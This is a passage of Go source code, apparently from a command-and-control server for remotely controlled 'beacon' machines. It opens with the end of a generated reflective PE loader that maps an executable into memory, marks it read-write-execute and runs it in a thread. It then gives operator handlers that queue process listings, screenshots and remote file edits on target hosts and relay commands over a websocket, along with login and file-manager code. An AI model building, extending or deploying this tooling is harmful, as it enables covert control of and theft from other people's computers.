		uintptr(imgBase), uintptr(sizeOfImg), MEM_COMMIT_RESERVE, PAGE_READWRITE)
	if base == 0 {
		base, _, _ = pVirtualAlloc.Call(0, uintptr(sizeOfImg), MEM_COMMIT_RESERVE, PAGE_READWRITE)
	}
	if base == 0 { return }

	/* Copy headers */
	pRtlMoveMemory.Call(base, uintptr(unsafe.Pointer(&pe[0])), uintptr(sizeOfHdr))

	/* Map sections */
	secOff := lfanew + 0x18 + uint32(optSz)
	for i := uint16(0); i < numSec; i++ {
		s := secOff + uint32(i)*40
		va     := r32(pe, s+12)
		rawSz  := r32(pe, s+16)
		rawPtr := r32(pe, s+20)
		if rawSz > 0 && rawPtr > 0 {
			pRtlMoveMemory.Call(
				base+uintptr(va),
				uintptr(unsafe.Pointer(&pe[rawPtr])),
				uintptr(rawSz))
		}
	}

	/* Relocations */
	delta := int64(base) - int64(imgBase)
	if delta != 0 {
		relocRVA  := r32(pe, lfanew+0xB0)
		relocSize := r32(pe, lfanew+0xB4)
		if relocSize > 0 && relocRVA > 0 {
			off := uint32(0)
			for off < relocSize {
				blkRVA  := *(*uint32)(unsafe.Pointer(base + uintptr(relocRVA+off)))
				blkSize := *(*uint32)(unsafe.Pointer(base + uintptr(relocRVA+off+4)))
				if blkSize == 0 { break }
				cnt := (blkSize - 8) / 2
				for j := uint32(0); j < cnt; j++ {
					entry := *(*uint16)(unsafe.Pointer(base + uintptr(relocRVA+off+8+j*2)))
					tp  := entry >> 12
					eo  := entry & 0xFFF
					patch := base + uintptr(blkRVA) + uintptr(eo)
					if tp == 10 { /* DIR64 */
						*(*int64)(unsafe.Pointer(patch)) += delta
					} else if tp == 3 { /* HIGHLOW */
						*(*int32)(unsafe.Pointer(patch)) += int32(delta)
					}
				}
				off += blkSize
			}
		}
	}

	/* Resolve imports */
	impRVA  := r32(pe, lfanew+0x90)
	impSize := r32(pe, lfanew+0x94)
	if impSize > 0 && impRVA > 0 {
		io := uint32(0)
		for {
			ib := base + uintptr(impRVA+io)
			origFT := *(*uint32)(unsafe.Pointer(ib))
			nameRV := *(*uint32)(unsafe.Pointer(ib + 12))
			firstT := *(*uint32)(unsafe.Pointer(ib + 16))
			if nameRV == 0 { break }

			hDll, _, _ := pLoadLibrary.Call(base + uintptr(nameRV))
			if hDll == 0 { io += 20; continue }

			tRVA := origFT
			if tRVA == 0 { tRVA = firstT }
			idx := uint32(0)
			for {
				tv := *(*uint64)(unsafe.Pointer(base + uintptr(tRVA) + uintptr(idx*8)))
				if tv == 0 { break }
				var fn uintptr
				if tv&0x8000000000000000 != 0 {
					fn, _, _ = pGetProcAddr.Call(hDll, uintptr(tv&0xFFFF))
				} else {
					fn, _, _ = pGetProcAddr.Call(hDll, base+uintptr(tv)+2)
				}
				*(*uintptr)(unsafe.Pointer(base + uintptr(firstT) + uintptr(idx*8))) = fn
				idx++
			}
			io += 20
		}
	}

	/* Set RWX + flush */
	var oldProt uint32
	pVirtualProtect.Call(base, uintptr(sizeOfImg), PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProt)))
	proc, _, _ := pGetCurrentProc.Call()
	pFlushICache.Call(proc, base, uintptr(sizeOfImg))

	/* Execute entry point */
	thread, _, _ := pCreateThread.Call(0, 0, base+uintptr(entryRVA), 0, 0, 0)
	pWaitForSingle.Call(thread, INFINITE)
}
`, len(peBytes), formatted)
}

func handleGetProcesses(c *gin.Context) {
	clientID := c.Query("client_id")
	if clientID == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "CLIENT_ID_REQUIRED"})
		return
	}

	// Queue a process listing task
	task, err := createPendingTask(clientID, "tasklist /v /fo csv")
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_QUEUE_PROCESS_LIST"})
		return
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "PROCESS_LIST_QUEUED", Data: map[string]string{"task_id": task.ID}})
}

func handleGetScreenshot(c *gin.Context) {
	clientID := c.Query("client_id")
	if clientID == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "CLIENT_ID_REQUIRED"})
		return
	}

	task, err := createPendingTask(clientID, "__SCREENSHOT__")
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_QUEUE_SCREENSHOT"})
		return
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "SCREENSHOT_QUEUED", Data: map[string]string{"task_id": task.ID}})
}

// ══════════════════════════════════════════════════════════
//  Middleware & Auth
// ══════════════════════════════════════════════════════════

func AuthRequired() gin.HandlerFunc {
	return func(c *gin.Context) {
		session := sessions.Default(c)
		auth := session.Get("authenticated")
		if auth != true {
			if c.GetHeader("X-Requested-With") == "XMLHttpRequest" || strings.HasPrefix(c.FullPath(), "/api/") {
				c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "UNAUTHORIZED"})
				c.Abort()
				return
			}
			c.Redirect(http.StatusSeeOther, "/")
			c.Abort()
			return
		}
		// Refresh session (sliding expiration) and apply new MaxAge if changed
		session.Save()
		c.Next()
	}
}

// ── Auth Handlers ────────────────────────────────────────

func handleLogin(c *gin.Context) {
	username := c.PostForm("username")
	password := c.PostForm("password")

	throttleKey := loginKey(c.ClientIP(), username)
	if loginLocked(throttleKey) {
		addLog("SEC", fmt.Sprintf("LOGIN_THROTTLED: %s from %s", username, c.ClientIP()))
		c.JSON(http.StatusTooManyRequests, APIResponse{Status: "error", Message: "TOO_MANY_ATTEMPTS"})
		return
	}

	var user User
	if err := db.Where("username = ?", username).First(&user).Error; err == nil {
		valid, needsUpgrade := verifyPassword(user.Password, password)
		if !valid {
			loginRecordFailure(throttleKey)
			addLog("SEC", fmt.Sprintf("LOGIN_FAILED: %s from %s", username, c.ClientIP()))
			c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "CREDENTIALS_REJECTED"})
			return
		}
		loginRecordSuccess(throttleKey)
		if needsUpgrade {
			if passwordHash, hashErr := hashPassword(password); hashErr == nil {
				db.Model(&user).Update("password", passwordHash)
			}
		}
		session := sessions.Default(c)
		session.Set("authenticated", true)
		session.Set("user", user.Username)
		session.Save()

		addLog("SEC", fmt.Sprintf("LOGIN_SUCCESS: %s from %s", username, c.ClientIP()))
		c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "AUTHENTICATED"})
		return
	}
	// Uniform failure response for unknown users; still burn a bcrypt hash
	// comparison so user enumeration via timing is harder.
	if valid, _ := verifyPassword("$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy", password); !valid {
		// always false; keeps timing uniform with the known-user path
		_ = valid
	}
	loginRecordFailure(throttleKey)
	addLog("SEC", fmt.Sprintf("LOGIN_FAILED: %s from %s", username, c.ClientIP()))
	c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "CREDENTIALS_REJECTED"})
}

func handleLogout(c *gin.Context) {
	session := sessions.Default(c)
	session.Clear()
	session.Save()
	c.Redirect(http.StatusSeeOther, "/")
}

func handleGetUserInfo(c *gin.Context) {
	session := sessions.Default(c)
	user := session.Get("user")
	if user == nil {
		user = "Operator"
	}

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"username": user,
		},
	})
}

func handleGetClients(c *gin.Context) {
	var clientList []Client
	group := c.Query("group")
	status := c.Query("status")

	query := db.Order("last_check desc")
	if group != "" {
		query = query.Where("\"group\" = ?", group)
	}
	if status != "" {
		query = query.Where("status = ?", status)
	}
	query.Find(&clientList)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: clientList})
}

func handleGetListeners(c *gin.Context) {
	var list []Listener
	db.Find(&list)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: list})
}

func handleWS(c *gin.Context) {
	// Get username from session at connection time
	session := sessions.Default(c)
	user := session.Get("user")
	wsUsername := "Operator"
	if user != nil {
		if username, ok := user.(string); ok && username != "" {
			wsUsername = username
		}
	}

	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.Println("WS upgrade error:", err)
		return
	}
	conn.SetReadLimit(1 << 20)

	client := &wsClient{
		conn: conn,
		send: make(chan string, 256),
	}

	// Replay recent logs before registering the client so the initial burst
	// is ordered; the buffer (256) covers the 200-entry ring.
	wsMutex.Lock()
	for _, l := range logs {
		client.send <- l
	}
	wsClients[client] = true
	wsMutex.Unlock()

	// Dedicated writer goroutine with per-write deadline: a stuck client can
	// never block the broadcast path or other clients.
	go func() {
		for msg := range client.send {
			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := conn.WriteMessage(websocket.TextMessage, []byte(msg)); err != nil {
				client.shutdown()
				return
			}
		}
		client.shutdown()
	}()

	defer client.shutdown()

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}

		var wsMsg struct {
			Type     string `json:"type"`
			Content  string `json:"content"`
			TargetID string `json:"target_id,omitempty"`
		}

		if err := json.Unmarshal(msg, &wsMsg); err == nil {
			if wsMsg.Type == "chat" {
				addLog("CHAT", fmt.Sprintf("[%s] %s", wsUsername, wsMsg.Content))
			} else if wsMsg.Type == "command" && wsMsg.TargetID != "" {
				processCommand(wsMsg.TargetID, wsMsg.Content)
			}
		}
	}
}

// ══════════════════════════════════════════════════════════
//  File Manager — Chunked Upload / Range Download
// ══════════════════════════════════════════════════════════

// safePath resolves a user-supplied relative path against fmRoot,
// preventing path traversal attacks.
func safePath(relPath string) (string, error) {
	if relPath == "" {
		relPath = "/"
	}
	// Clean the path
	cleaned := filepath.Clean(relPath)
	// Reject absolute paths or traversal
	if filepath.IsAbs(cleaned) {
		// Strip leading slash/backslash for joining
		cleaned = strings.TrimLeft(cleaned, "/\\")
	}
	joined := filepath.Join(fmRoot, cleaned)
	abs, err := filepath.Abs(joined)
	if err != nil {
		return "", fmt.Errorf("INVALID_PATH")
	}
	root, err := filepath.Abs(fmRoot)
	if err != nil {
		return "", fmt.Errorf("SERVER_ERROR")
	}
	// Ensure the managed root exists before resolving symlinks. A fresh
	// installation otherwise fails every operation because EvalSymlinks(root)
	// cannot resolve a directory that has not been created yet.
	if err := os.MkdirAll(root, 0755); err != nil {
		return "", fmt.Errorf("SERVER_ERROR")
	}
	// Ensure resolved path is within root
	if abs != root && !strings.HasPrefix(abs, root+string(filepath.Separator)) {
		return "", fmt.Errorf("PATH_TRAVERSAL_DENIED")
	}
	// Lexical checks do not protect against symlinks inside the managed root.
	if !pathWithinRoot(abs, root) {
		return "", fmt.Errorf("PATH_TRAVERSAL_DENIED")
	}
	return abs, nil
}

// pathWithinRoot resolves the nearest existing ancestor so symlinked parent
// directories are checked even when the final target does not exist yet.
func pathWithinRoot(path, root string) bool {
	rootAbs, err := filepath.Abs(root)
	if err != nil {
		return false
	}
	rootResolved, err := filepath.EvalSymlinks(rootAbs)
	if err != nil {
		return false
	}
	rootResolved, _ = filepath.Abs(rootResolved)
	probe := path
	for {
		if resolved, err := filepath.EvalSymlinks(probe); err == nil {
			resolved, _ = filepath.Abs(resolved)
			return resolved == rootResolved || strings.HasPrefix(resolved, rootResolved+string(filepath.Separator))
		}
		parent := filepath.Dir(probe)
		if parent == probe {
			return false
		}
		probe = parent
	}
}

// handleFMList lists directory contents
func handleFMList(c *gin.Context) {
	relPath := c.Query("path")
	if relPath == "" {
		relPath = "/"
	}

	absPath, err := safePath(relPath)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	// Ensure root exists
	root, _ := filepath.Abs(fmRoot)
	os.MkdirAll(root, 0755)

	info, err := os.Stat(absPath)
	if err != nil {
		if os.IsNotExist(err) {
			// If path doesn't exist and it's root, create it
			if absPath == root {
				os.MkdirAll(absPath, 0755)
			} else {
				c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "PATH_NOT_FOUND"})
				return
			}
		} else {
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}
		if err := os.MkdirAll(absPath, 0755); err != nil {
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
			return
		}
		info, err = os.Stat(absPath)
		if err != nil {
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "STAT_FAILED: " + err.Error()})
			return
		}
	}

	if !info.IsDir() {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "NOT_A_DIRECTORY"})
		return
	}

	entries, err := os.ReadDir(absPath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	type FileItem struct {
		Name    string    `json:"name"`
		Path    string    `json:"path"`
		IsDir   bool      `json:"is_dir"`
		Size    int64     `json:"size"`
		ModTime time.Time `json:"mod_time"`
	}

	items := make([]FileItem, 0, len(entries))
	for _, e := range entries {
		fi, err := e.Info()
		if err != nil {
			continue
		}
		// Compute relative path from root
		entryAbs := filepath.Join(absPath, e.Name())
		entryRel, _ := filepath.Rel(root, entryAbs)
		entryRel = "/" + strings.ReplaceAll(entryRel, "\\", "/")

		items = append(items, FileItem{
			Name:    e.Name(),
			Path:    entryRel,
			IsDir:   e.IsDir(),
			Size:    fi.Size(),
			ModTime: fi.ModTime(),
		})
	}

	// Current path relative to root
	currentRel, _ := filepath.Rel(root, absPath)
	currentRel = "/" + strings.ReplaceAll(currentRel, "\\", "/")
	if currentRel == "/." {
		currentRel = "/"
	}

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"path":  currentRel,
			"items": items,
		},
	})
}

// handleFMMkdir creates a directory
func handleFMMkdir(c *gin.Context) {
	var req struct {
		Path string `json:"path" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	absPath, err := safePath(req.Path)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	if err := os.MkdirAll(absPath, 0755); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	addLog("FILE", "DIRECTORY_CREATED: "+req.Path)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "DIRECTORY_CREATED"})
}

// handleFMRename renames a file or directory
func handleFMRename(c *gin.Context) {
	var req struct {
		OldPath string `json:"old_path" binding:"required"`
		NewName string `json:"new_name" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	oldAbs, err := safePath(req.OldPath)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	// New path = same parent + new name
	newName := strings.TrimSpace(req.NewName)
	if newName == "" || newName == "." || newName == ".." || strings.ContainsAny(newName, `/\\`) {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_FILENAME"})
		return
	}
	newAbs := filepath.Join(filepath.Dir(oldAbs), newName)
	root, _ := filepath.Abs(fmRoot)
	if newAbs != root && !strings.HasPrefix(newAbs, root+string(filepath.Separator)) {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "PATH_TRAVERSAL_DENIED"})
		return
	}
	if !pathWithinRoot(newAbs, root) {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "PATH_TRAVERSAL_DENIED"})
		return
	}

	if err := os.Rename(oldAbs, newAbs); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	addLog("FILE", fmt.Sprintf("RENAMED: %s -> %s", req.OldPath, req.NewName))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "RENAMED"})
}

// handleFMDelete deletes a file or directory
func handleFMDelete(c *gin.Context) {
	var req struct {
		Path string `json:"path" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	absPath, err := safePath(req.Path)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	// Don't allow deleting root
	root, _ := filepath.Abs(fmRoot)
	if absPath == root {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "CANNOT_DELETE_ROOT"})
		return
	}

	if err := os.RemoveAll(absPath); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	addLog("FILE", "DELETED: "+req.Path)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "DELETED"})
}

// handleFMInfo returns file info (size, etc.) before download
func handleFMInfo(c *gin.Context) {
	relPath := c.Query("path")
	absPath, err := safePath(relPath)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	fi, err := os.Stat(absPath)
	if err != nil {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "FILE_NOT_FOUND"})
		return
	}

	sha, _ := computeSHA256(absPath)

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"name":     fi.Name(),
			"size":     fi.Size(),
			"is_dir":   fi.IsDir(),
			"mod_time": fi.ModTime(),
			"sha256":   sha,
		},
	})
}

// ── Chunked Upload ───────────────────────────────────────

// handleFMUploadInit initializes a chunked upload session
func handleFMUploadInit(c *gin.Context) {
	const maxUploadChunks = 100000
	var req struct {
		FileName    string `json:"file_name" binding:"required"`
		DestPath    string `json:"dest_path"` // directory to upload into
		TotalSize   int64  `json:"total_size" binding:"required"`
		TotalChunks int    `json:"total_chunks" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	if req.TotalSize <= 0 || req.TotalSize > maxManagedUploadSize || req.TotalChunks <= 0 || req.TotalChunks > maxUploadChunks {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_UPLOAD_SIZE"})
		return
	}

	if req.DestPath == "" {
		req.DestPath = "/"
	}
	fileName := filepath.Base(filepath.Clean(req.FileName))
	if fileName == "" || fileName == "." || fileName == ".." {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_FILENAME"})
		return
	}

	// Validate destination
	destAbs, err := safePath(req.DestPath)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	if err := os.MkdirAll(destAbs, 0755); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "DEST_DIR_FAILED"})
		return
	}

	uploadID := "UP-" + uuid.New().String()[:8]

	// Create temp directory for chunks
	tmpDir := filepath.Join(os.TempDir(), "prts_upload_"+uploadID)
	os.MkdirAll(tmpDir, 0755)

	session := &UploadSession{
		ID:          uploadID,
		FileName:    fileName,
		DestPath:    req.DestPath,
		TotalSize:   req.TotalSize,
		TotalChunks: req.TotalChunks,
		Received:    make(map[int]bool),
		ChunkSizes:  make(map[int]int64),
		TempDir:     tmpDir,
		CreatedAt:   time.Now(),
	}

	uploadSessionsMu.Lock()
	uploadSessions[uploadID] = session
	uploadSessionsMu.Unlock()

	addLog("FILE", fmt.Sprintf("UPLOAD_INIT: %s (%d bytes, %d chunks)", fileName, req.TotalSize, req.TotalChunks))

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"upload_id":    uploadID,
			"total_chunks": req.TotalChunks,
		},
	})
}

// handleFMUploadChunk receives a single chunk. Locking is per session so
// concurrent uploads of different files never serialize behind one another.
func handleFMUploadChunk(c *gin.Context) {
	c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, maxManagedUploadSize+1<<20)
	uploadID := c.Param("upload_id")

	uploadSessionsMu.Lock()
	session, exists := uploadSessions[uploadID]
	uploadSessionsMu.Unlock()

	if !exists {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "UPLOAD_SESSION_NOT_FOUND"})
		return
	}

	chunkIndexStr := c.PostForm("chunk_index")
	if chunkIndexStr == "" {
		chunkIndexStr = c.Query("chunk_index")
	}
	chunkIndex, err := strconv.Atoi(chunkIndexStr)
	if err != nil || chunkIndex < 0 || chunkIndex >= session.TotalChunks {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_CHUNK_INDEX"})
		return
	}

	file, err := c.FormFile("chunk")
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "CHUNK_DATA_MISSING: " + err.Error()})
		return
	}
	if file.Size > session.TotalSize {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "CHUNK_EXCEEDS_TOTAL_SIZE"})
		return
	}

	session.mu.Lock()
	if session.Completed {
		session.mu.Unlock()
		c.JSON(http.StatusConflict, APIResponse{Status: "error", Message: "UPLOAD_ALREADY_COMPLETING"})
		return
	}
	if session.ChunkSizes == nil {
		session.ChunkSizes = make(map[int]int64)
	}
	previousSize := session.ChunkSizes[chunkIndex]
	projectedSize := session.ReceivedBytes - previousSize + file.Size
	if projectedSize > session.TotalSize {
		session.mu.Unlock()
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "UPLOAD_EXCEEDS_TOTAL_SIZE"})
		return
	}
	chunkPath := filepath.Join(session.TempDir, fmt.Sprintf("chunk_%06d", chunkIndex))
	if err := c.SaveUploadedFile(file, chunkPath); err != nil {
		session.mu.Unlock()
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "CHUNK_SAVE_FAILED: " + err.Error()})
		return
	}
	session.ChunkSizes[chunkIndex] = file.Size
	session.ReceivedBytes = projectedSize
	session.Received[chunkIndex] = true
	received := len(session.Received)
	session.mu.Unlock()

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"chunk_index": chunkIndex,
			"received":    received,
			"total":       session.TotalChunks,
		},
	})
}

// handleFMUploadComplete merges chunks into the final file. Chunks are
// streamed with io.Copy instead of being read into memory, so even a 512MB
// upload completes with constant memory usage.
func handleFMUploadComplete(c *gin.Context) {
	uploadID := c.Param("upload_id")
	claimed := false
	completed := false

	uploadSessionsMu.Lock()
	session, exists := uploadSessions[uploadID]
	if exists && session.Completed {
		uploadSessionsMu.Unlock()
		c.JSON(http.StatusConflict, APIResponse{Status: "error", Message: "UPLOAD_ALREADY_COMPLETING"})
		return
	}
	session.mu.Lock()
	if exists && len(session.Received) == session.TotalChunks {
		session.Completed = true
		claimed = true
	}
	totalChunks := session.TotalChunks
	tempDir := session.TempDir
	session.mu.Unlock()
	uploadSessionsMu.Unlock()

	if claimed {
		defer func() {
			if completed {
				return
			}
			uploadSessionsMu.Lock()
			if current, ok := uploadSessions[uploadID]; ok && current == session {
				current.mu.Lock()
				current.Completed = false
				current.mu.Unlock()
			}
			uploadSessionsMu.Unlock()
		}()
	}

	if !exists {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "UPLOAD_SESSION_NOT_FOUND"})
		return
	}

	// Verify all chunks received
	session.mu.Lock()
	receivedChunks := len(session.Received)
	session.mu.Unlock()
	if receivedChunks != totalChunks {
		c.JSON(http.StatusBadRequest, APIResponse{
			Status:  "error",
			Message: fmt.Sprintf("INCOMPLETE: %d/%d chunks received", receivedChunks, totalChunks),
		})
		return
	}

	// Resolve final destination
	destAbs, err := safePath(session.DestPath)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	finalPath := filepath.Join(destAbs, session.FileName)
	root, _ := filepath.Abs(fmRoot)
	if !pathWithinRoot(finalPath, root) {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "PATH_TRAVERSAL_DENIED"})
		return
	}

	// Merge chunks (streamed)
	outFile, err := os.Create(finalPath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "CREATE_FAILED: " + err.Error()})
		return
	}
	mergeFailed := false
	for i := 0; i < totalChunks && !mergeFailed; i++ {
		chunkPath := filepath.Join(tempDir, fmt.Sprintf("chunk_%06d", i))
		chunkFile, err := os.Open(chunkPath)
		if err != nil {
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: fmt.Sprintf("CHUNK_READ_FAILED: chunk %d", i)})
			mergeFailed = true
			break
		}
		_, copyErr := io.Copy(outFile, chunkFile)
		chunkFile.Close()
		if copyErr != nil {
			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "WRITE_FAILED: " + copyErr.Error()})
			mergeFailed = true
		}
	}
	if mergeFailed {
		outFile.Close()
		os.Remove(finalPath)
		return
	}

	// Cleanup temp + verify size
	if fi, err := outFile.Stat(); err != nil || fi.Size() != session.TotalSize {
		outFile.Close()
		os.Remove(finalPath)
		message := "UPLOAD_SIZE_MISMATCH"
		if err != nil {
			message = "UPLOAD_STAT_FAILED: " + err.Error()
		}
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: message})
		return
	}
	outFile.Close()
	os.RemoveAll(tempDir)

	uploadSessionsMu.Lock()
	delete(uploadSessions, uploadID)
	uploadSessionsMu.Unlock()
	completed = true

	fi, err := os.Stat(finalPath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "STAT_FAILED: " + err.Error()})
		return
	}
	root, _ = filepath.Abs(fmRoot)
	relFinal, _ := filepath.Rel(root, finalPath)
	relFinal = "/" + strings.ReplaceAll(relFinal, "\\", "/")

	addLog("FILE", fmt.Sprintf("UPLOAD_COMPLETE: %s (%d bytes)", session.FileName, fi.Size()))

	c.JSON(http.StatusOK, APIResponse{
		Status:  "success",
		Message: "UPLOAD_COMPLETE",
		Data: map[string]interface{}{
			"name": session.FileName,
			"path": relFinal,
			"size": fi.Size(),
		},
	})
}

// ── Chunked Download (HTTP Range) ────────────────────────

// handleFMDownload serves a file with Range header support for chunked download
func handleFMDownload(c *gin.Context) {
	relPath := c.Query("path")
	absPath, err := safePath(relPath)
	if err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	fi, err := os.Stat(absPath)
	if err != nil || fi.IsDir() {
		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "FILE_NOT_FOUND"})
		return
	}

	// Use http.ServeFile which handles Range headers automatically
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", fi.Name()))
	c.Header("Accept-Ranges", "bytes")
	http.ServeFile(c.Writer, c.Request, absPath)
}

// computeSHA256 returns the hex string of SHA256 hash of a file
func computeSHA256(filePath string) (string, error) {
	f, err := os.Open(filePath)
	if err != nil {
		return "", err
	}
	defer f.Close()

	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}

// isTextFile checks if a file is likely a text file based on extension
func isTextFile(fileName string) bool {
	ext := strings.ToLower(filepath.Ext(fileName))
	textExts := map[string]bool{
		".txt": true, ".php": true, ".js": true, ".py": true,
		".html": true, ".css": true, ".json": true, ".sh": true,
		".ps1": true, ".go": true, ".bat": true, ".ini": true,
		".conf": true, ".cfg": true, ".yaml": true, ".yml": true,
		".md": true, ".log": true, ".xml": true,
		".c": true, ".cpp": true, ".h": true, ".hpp": true,
		".java": true, ".rs": true, ".toml": true, ".env": true,
		".sql": true, ".csv": true, ".tsv": true, ".properties": true,
		".ts": true, ".jsx": true, ".tsx": true, ".vue": true,
		".rb": true, ".pl": true, ".lua": true, ".r": true,
		".swift": true, ".kt": true, ".scala": true, ".gradle": true,
		".tf": true, ".hcl": true, ".proto": true,
	}
	return textExts[ext]
}

// handleRemoteFMEdit handles editing a remote file
func handleRemoteFMEdit(c *gin.Context) {
	var req struct {
		ClientID       string `json:"client_id" binding:"required"`
		Path           string `json:"path" binding:"required"`
		Content        string `json:"content"`
		OriginalSHA256 string `json:"original_sha256"` // removed binding:"required" since new files or empty files might have empty SHA or not provide it properly
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	b64Data := base64.StdEncoding.EncodeToString([]byte(req.Content))
	cmd := fmt.Sprintf("__FILEEDIT__ %s||%s||%s", req.Path, req.OriginalSHA256, b64Data)

	// Extra timeout since we might write large text files
	resultStr, err := sendTaskAndWait(req.ClientID, cmd, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	var res map[string]interface{}
	if err := json.Unmarshal([]byte(resultStr), &res); err != nil {
		// Beacon returned non-JSON response (e.g., shell error output)
		// This usually means the command leaked into the system shell
		c.JSON(http.StatusInternalServerError, APIResponse{
			Status:  "error",
			Message: "BEACON_ERROR: non-JSON response (possible command execution failure)",
			Data:    map[string]string{"raw_response": resultStr},
		})
		return
	}

	if errStr, ok := res["error"].(string); ok {
		// Provide conflict details if available
		if errStr == "CONFLICT" {
			currentSHA, _ := res["current_sha256"].(string)
			c.JSON(http.StatusConflict, APIResponse{
				Status:  "error",
				Message: "CONFLICT: File has been modified by another process",
				Data:    map[string]string{"current_sha256": currentSHA},
			})
			return
		}
		if errStr == "PERMISSION_DENIED" {
			c.JSON(http.StatusForbidden, APIResponse{Status: "error", Message: errStr})
			return
		}
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: errStr})
		return
	}

	newSHA, _ := res["new_sha256"].(string)

	// Audit log
	remoteIP := extractIP(c.Request.RemoteAddr)
